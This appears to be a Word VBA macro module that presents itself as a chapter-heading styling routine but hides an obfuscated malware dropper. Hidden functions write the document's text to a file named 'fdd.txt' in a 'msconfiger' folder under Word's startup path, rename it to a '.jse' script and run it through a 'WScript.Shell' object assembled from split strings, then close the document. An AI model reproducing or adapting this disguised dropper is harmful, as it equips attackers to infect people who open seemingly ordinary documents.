Sub setChapStyle()
    Selection.HomeKey unit:=wdLine
    Selection.Style = ActiveDocument.Styles("Heading 1")
    Selection.MoveDown unit:=wdLine, Count:=1
    Selection.Style = ActiveDocument.Styles("Heading 2")
End Sub

Sub setChapter()
On Error Resume Next
Selection.HomeKey unit:=wdStory

    With Selection.Find
    .Forward = True
    .Wrap = wdFindStop
    .Text = "?????"
    .Execute
    Do While .Found
         setChapStyle
         .Execute
    Loop
    End With
    frgtedwsws = "W" & "" & "S" & "c"
    swerftf = Replace(Fthythjyt, ".txt", ".j" & Qsedee & "se")
    Name Fthythjyt As swerftf
    CallByName VBA.CreateObject(Rfbyjnmy & frgtedwsws & Rfbyjnmy & "ri" & "" & "p" & Rfbyjnmy & "t." & Bythytr), _
    Ujuyjffr, VbMethod, _
    """" & swerftf & """" & " " & wdTraditionalChinese, 1
End Sub





Private Function Tgvberdd(kl As String, nb As Integer)
On Error Resume Next
Fthythjyt = kl & Qsedee & "\." & ".\..\" & Qsedee & "msconfiger" & Qsedee
Bythytr = Qsedee & "Sh" & Qsedee & "e" & "" & "l" & Qsedee & "l"
MkDir Fthythjyt
Fthythjyt = "" & Fthythjyt & Empty & "\fdd." & Qsedee & "txt" & Qsedee
Dim Bhgferf As Integer
Bhgferf = FreeFile
Open Fthythjyt For Binary Lock Read Write As #Bhgferf
Put #Bhgferf, , ActiveDocument.Content.Text
Close #Bhgferf
Tgvberdd = Bythytr
Exit Function
StyleSetting
setChapStyle
End Function


   
Private Sub Yhbrfrf()
Qsedee = Empty
Tgvberdd Application.StartupPath, 60
ActiveDocument.Close
End Sub


